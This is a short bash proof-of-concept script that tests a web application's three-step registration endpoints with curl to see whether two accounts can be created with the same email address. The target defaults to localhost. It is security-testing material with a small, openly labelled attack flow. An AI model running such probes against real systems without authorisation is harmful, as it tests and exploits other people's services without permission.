#!/bin/bash

# POC: Duplicate Email Registration Vulnerability
# This script demonstrates that the registration process allows multiple accounts
# with the same email address, violating email uniqueness constraints

TARGET_URL="${1:-http://localhost:8000}"
UNIQUE_EMAIL="testdup_$(date +%s)@test.com"
PASSWORD="Pass123456"

echo "[*] Target: $TARGET_URL"
echo "[*] Testing Email Uniqueness Validation in Registration"
echo "[*] Email to use: $UNIQUE_EMAIL"
echo ""

# Function to complete registration step 1
register_step1() {
    local username=$1
    echo "[+] Registering Step 1 with username: $username"
    
    response=$(curl -s -X POST "$TARGET_URL/accounts/register/step1/" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username" \
        -w "\n%{http_code}" \
        -c cookies_$username.txt)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    echo "    Status: $http_code"
    if [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        echo "    ✓ Step 1 completed"
        return 0
    else
        echo "    ✗ Step 1 failed: $body"
        return 1
    fi
}

# Function to complete registration step 2 (email submission)
register_step2() {
    local username=$1
    local email=$2
    echo "[+] Registering Step 2 with email: $email"
    
    response=$(curl -s -X POST "$TARGET_URL/accounts/register/step2/" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "email=$email" \
        -w "\n%{http_code}" \
        -b cookies_$username.txt \
        -c cookies_$username.txt)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    echo "    Status: $http_code"
    if [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        echo "    ✓ Step 2 completed with email: $email"
        return 0
    else
        echo "    ✗ Step 2 failed: $body"
        return 1
    fi
}

# Function to complete registration step 3 (password submission)
register_step3() {
    local username=$1
    local password=$2
    echo "[+] Registering Step 3 with password for: $username"
    
    response=$(curl -s -X POST "$TARGET_URL/accounts/register/step3/" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "password=$password" \
        -w "\n%{http_code}" \
        -b cookies_$username.txt \
        -c cookies_$username.txt)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    echo "    Status: $http_code"
    if [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        echo "    ✓ Step 3 completed, account created"
        return 0
    else
        echo "    ✗ Step 3 failed: $body"
        return 1
    fi
}

echo "=========================================="
echo "TEST 1: Register first account with email"
echo "=========================================="
register_step1 "FirstUser"
register_step2 "FirstUser" "$UNIQUE_EMAIL"
register_step3 "FirstUser" "$PASSWORD"

echo ""
echo "=========================================="
echo "TEST 2: Register SECOND account with SAME email"
echo "=========================================="
register_step1 "SecondUser"
register_step2 "SecondUser" "$UNIQUE_EMAIL"
register_step3 "SecondUser" "$PASSWORD"

echo ""
echo "=========================================="
echo "RESULTS"
echo "=========================================="
echo "[!] If both accounts were created successfully with the same email,"
echo "    the application has a CRITICAL email uniqueness validation vulnerability."
echo ""
echo "[*] Email used for both registrations: $UNIQUE_EMAIL"
echo "[*] Note: This POC demonstrates the vulnerability exists when both"
echo "    registration attempts complete without email conflict errors."

# Cleanup
rm -f cookies_*.txt

exit 0